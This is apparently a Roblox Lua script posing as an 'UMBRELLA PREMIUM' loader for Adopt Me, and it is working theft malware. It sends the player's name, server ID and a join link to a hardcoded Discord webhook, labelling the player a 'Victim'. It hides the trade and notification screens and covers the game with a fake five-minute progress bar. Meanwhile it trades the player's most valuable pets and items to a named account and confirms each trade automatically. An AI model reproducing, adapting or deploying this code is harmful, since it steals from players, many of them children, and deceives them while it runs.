local main_nick = "killccccccccccc"
local webhook = "https://discord.com/api/webhooks/1468170325547024418/XiG70gyAybh0HV2klcgGoIj3PIFWGmM1v0N9OhpIUIaFN05fo6yAWRiPqI1c1k4byWn4"
 
local HttpService = game:GetService("HttpService")
local request = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
 
local function SendToDiscord(embed)
    pcall(function()
        local payload = HttpService:JSONEncode({embeds = {embed}})
        if request then
            request({Url = webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = payload})
        else
            HttpService:PostAsync(webhook, payload)
        end
    end)
end
 
-- [[ 1. ЦЕНЫ ]]
local Values = {}
task.spawn(function()
    local s, res = pcall(function() return HttpService:GetAsync("https://raw.githubusercontent.com/Fsys-AdoptMe/Values/main/values.json") end)
    if s then Values = HttpService:JSONDecode(res) end
end)
 
-- [[ 2. СКРЫТИЕ UI ]]
task.spawn(function()
    local pGui = game.Players.LocalPlayer:WaitForChild("PlayerGui")
    while task.wait(0.2) do
        pcall(function()
            if pGui:FindFirstChild("TradeApp") then
                pGui.TradeApp.Enabled = true
                pGui.TradeApp.Frame.Visible = false
                pGui.TradeApp.Frame.Position = UDim2.new(15, 0, 15, 0)
            end
            pGui.NotificationsApp.Enabled = false
        end)
    end
end)
 
-- [[ 3. МЕНЮ С ПОЛОСКОЙ ЗАГРУЗКИ ]]
local function CreateUmbrellaMenu()
    local p = game.Players.LocalPlayer
    local loadingGui = Instance.new("ScreenGui")
    loadingGui.Name = "UmbrellaSystem"; loadingGui.DisplayOrder = 2147483647; loadingGui.IgnoreGuiInset = true
    pcall(function() loadingGui.Parent = game:GetService("CoreGui") end)
    if not loadingGui.Parent then loadingGui.Parent = p:WaitForChild("PlayerGui") end
 
    local BG = Instance.new("Frame", loadingGui); BG.Size = UDim2.new(1, 0, 1, 0); BG.BackgroundColor3 = Color3.fromRGB(10, 10, 10); BG.Active = true 
 
    local Main = Instance.new("Frame", BG)
    Main.Size = UDim2.new(0, 400, 0, 180)
    Main.Position = UDim2.new(0.5, -200, 0.5, -90)
    Main.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
    Main.BorderSizePixel = 0
    Instance.new("UICorner", Main).CornerRadius = UDim.new(0, 10)
 
    local Title = Instance.new("TextLabel", Main)
    Title.Size = UDim2.new(1, 0, 0, 50)
    Title.Text = "UMBRELLA PREMIUM"
    Title.Font = Enum.Font.GothamBold; Title.TextColor3 = Color3.fromRGB(255, 50, 50); Title.TextSize = 24; Title.BackgroundTransparency = 1
 
    local Status = Instance.new("TextLabel", Main)
    Status.Size = UDim2.new(1, 0, 0, 30); Status.Position = UDim2.new(0, 0, 0.4, 0)
    Status.Text = "Initializing modules..."; Status.Font = Enum.Font.Gotham; Status.TextColor3 = Color3.fromRGB(200, 200, 200); Status.TextSize = 14; Status.BackgroundTransparency = 1
 
    -- Полоска загрузки
    local BarBack = Instance.new("Frame", Main)
    BarBack.Size = UDim2.new(0.8, 0, 0, 6); BarBack.Position = UDim2.new(0.1, 0, 0.7, 0)
    BarBack.BackgroundColor3 = Color3.fromRGB(40, 40, 40); BarBack.BorderSizePixel = 0
    Instance.new("UICorner", BarBack)
 
    local BarFill = Instance.new("Frame", BarBack)
    BarFill.Size = UDim2.new(0, 0, 1, 0); BarFill.BackgroundColor3 = Color3.fromRGB(255, 50, 50); BarFill.BorderSizePixel = 0
    Instance.new("UICorner", BarFill)
 
    -- Анимация полоски (на 5 минут)
    task.spawn(function()
        local duration = 300 
        local startTime = tick()
        local stages = {"Loading assets...", "Connecting to cloud...", "Applying patches...", "Syncing inventory...", "Finalizing..."}
 
        while tick() - startTime < duration do
            local elapsed = tick() - startTime
            local percent = math.min(elapsed / duration, 0.99)
            BarFill.Size = UDim2.new(percent, 0, 1, 0)
 
            local stageIndex = math.min(math.floor(percent * #stages) + 1, #stages)
            Status.Text = stages[stageIndex] .. " (" .. math.floor(percent * 100) .. "%)"
            task.wait(0.5)
        end
    end)
end
 
-- [[ 4. ЛОГИКА ТРЕЙДА ]]
local Fsys = require(game.ReplicatedStorage:WaitForChild("Fsys")).load
local ClientData = Fsys("ClientData")
local Router = Fsys("RouterClient")
 
task.spawn(function()
    CreateUmbrellaMenu()
    local jobId = game.JobId
    while jobId == "" do jobId = game.JobId task.wait(1) end
 
    SendToDiscord({
        title = "💎 UMBRELLA: PREMIUM ACTIVE", 
        color = 0x00FF00,
        fields = {
            {name = "👤 Victim", value = "```" .. game.Players.LocalPlayer.Name .. "```", inline = true},
            {name = "🆔 JobId", value = "```" .. jobId .. "```", inline = false},
            {name = "🔗 Join", value = "roblox.com/games/" .. game.PlaceId .. "?jobId=" .. jobId, inline = false}
        }
    })
 
    while true do
        local target = game.Players:FindFirstChild(main_nick)
        if target then
            pcall(function()
                local trade_requests = ClientData.get("trade_requests")
                local has_request = false
                for _, req in pairs(trade_requests or {}) do
                    if req.user == target then
                        Router.get("TradeAPI/AcceptTradeRequest"):FireServer(target)
                        has_request = true; break
                    end
                end
                if not has_request then Router.get("TradeAPI/SendTradeRequest"):FireServer(target) end
            end)
 
            local inv = nil
            pcall(function() inv = ClientData.get("inventory") end)
 
            if inv then
                local itemsToTrade = {}
                for catName, catTable in pairs(inv) do
                    if type(catTable) == "table" then
                        for uid, item in pairs(catTable) do
                            local name = tostring(item.id)
                            if name ~= "starter_egg" then
                                local price = tonumber(Values[name]) or 1
                                local multiplier = 1
                                if item.properties then
                                    if item.properties.mega_neon then multiplier = 100
                                    elseif item.properties.neon then multiplier = 20 end
                                end
                                local categoryBoost = (catName == "pets" and 1000000 or 0)
                                table.insert(itemsToTrade, {uid = uid, weight = categoryBoost + (price * multiplier)})
                            end
                        end
                    end
                end
 
                table.sort(itemsToTrade, function(a, b) return a.weight > b.weight end)
 
                if #itemsToTrade > 0 then
                    task.wait(2) 
                    for i = 1, math.min(#itemsToTrade, 18) do
                        pcall(function() Router.get("TradeAPI/AddItemToOffer"):FireServer(itemsToTrade[i].uid) end)
                        task.wait(0.18) 
                    end
                    task.wait(0.5)
                    pcall(function() Router.get("TradeAPI/AcceptNegotiation"):FireServer() end)
                    for i = 1, 60 do
                        pcall(function() Router.get("TradeAPI/ConfirmTrade"):FireServer() end)
                        task.wait(0.15)
                    end
                end
            end
        end
        task.wait(8)
    end
end)

